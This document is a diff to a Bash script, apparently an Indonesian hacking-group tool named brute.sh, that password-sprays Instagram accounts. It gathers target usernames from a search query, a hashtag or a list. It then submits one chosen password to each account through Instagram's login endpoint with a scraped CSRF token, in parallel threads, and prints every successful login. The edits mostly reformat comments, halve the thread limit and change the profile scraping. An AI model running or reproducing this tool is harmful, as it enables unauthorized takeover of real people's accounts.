@@ -1,10 +1,10 @@
-#!/bin/bash
-#author         : ./Lolz
-#thanks to      : JavaGhost - Bashid.org
-#recode tinggal recode aja okeh?, tapi cantumin source Y tolol h3h3
-#Yamaap kalau scriptnya acak"an:(
+# !/bin/bash
+# author         : ./Lolz
+# thanks to      : JavaGhost - Bashid.org
+# recode tinggal recode aja okeh?, tapi cantumin source Y tolol h3h3
+# Yamaap kalau scriptnya acak"an:(
 
-#color(bold)
+# color(bold)
 red='\e[1;31m'
 green='\e[1;32m'
 yellow='\e[1;33m'
@@ -13,10 +13,10 @@ magenta='\e[1;35m'
 cyan='\e[1;36m'
 white='\e[1;37m'
 
-#thread limit => kurangin lebih kecil angkanya boleh, naikin? saran w jangan... awokwowok:v
-limit=100
+# thread limit => kurangin lebih kecil angkanya boleh, naikin? saran w jangan... awokwowok:v
+limit=50
 
-#banner
+# banner
 echo -e $'''
                 _  __       _ 
 __     | _|_ o |_)|_     o (_|
@@ -24,7 +24,7 @@ __     | _|_ o |_)|_     o (_|
 \e[1;31mcontact: https://fb.me/n00b.me\e[1;37m
 '''
 
-#dependencies
+# dependencies
 dependencies=( "jq" "curl" )
 for i in "${dependencies[@]}"
 do
@@ -34,7 +34,7 @@ do
     }
 done
 
-#menu
+# menu
 echo -e '''
 1]. Get target from specific \e[1;31m@username\e[1;37m
 2]. Get target from specific \e[1;31m#hashtag\e[1;37m
@@ -46,14 +46,14 @@ read -p $'What do you want   : \e[1;33m' opt
 touch target
 
 case $opt in
-    1) #menu 1
+    1) # menu 1
         read -p $'\e[37m[\e[34m?\e[37m] Search by query   : \e[1;33m' ask
         collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
         echo $'\e[37m[\e[34m+\e[37m] Just found        : \e[1;33m'$collect''$(< target wc -l ; echo -e "${white}user")
         read -p $'[\e[1;34m?\e[1;37m] Password to use   : \e[1;33m' pass
         echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
         ;;
-    2) #menu 2
+    2) # menu 2
         read -p $'\e[37m[\e[34m?\e[37m] Tags for use      : \e[1;33m' hashtag
         get=$(curl -sX GET "https://www.instagram.com/explore/tags/${hashtag}/?__a=1")
         if [[ $get =~ "Page Not Found" ]]; then
@@ -72,7 +72,7 @@ case $opt in
             rm hashtag result
         fi
         ;;
-    3) #menu 3
+    3) # menu 3
         read -p $'\e[37m[\e[34m?\e[37m] Input your list   : \e[1;33m' list
         if [[ ! -e $list ]]; then
             echo -e "${red}file not found${white}"
@@ -84,14 +84,14 @@ case $opt in
                 echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
         fi
         ;;
-    *) #wrong menu
+    *) # wrong menu
         echo -e "${white}options are not on the menu"
         sleep 1
         clear
         bash brute.sh
 esac
 
-#start_brute
+# start_brute
 token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
 function brute(){
     url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
@@ -104,7 +104,7 @@ function brute(){
                     -d "username=${i}&password=${pass}")
                     login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
                     if [[ $login =~ "true" ]]; then
-                            echo -e "[${green}+${white}] ${yellow}You get it! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(curl -s "https://www.instagram.com/$i/" | grep "<meta content=" | cut -d '"' -f2 | cut -d "," -f1)
+                            echo -e "[${green}+${white}] ${yellow}You get it! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(grep -o '<meta property="og:description" content=".*' | cut -d '"' -f4 | cut -d " " -f1)
                         elif [[ $login =~ "false" ]]; then
                                     echo -e "[${red}!${white}] @$i - ${red}failed to crack${white}"
                             elif [[ $url =~ "checkpoint_required" ]]; then
@@ -112,7 +112,7 @@ function brute(){
                     fi
 }
 
-#thread
+# thread
 (
     for i in $(cat target); do
         ((thread=thread%limit)); ((thread++==0)) && wait
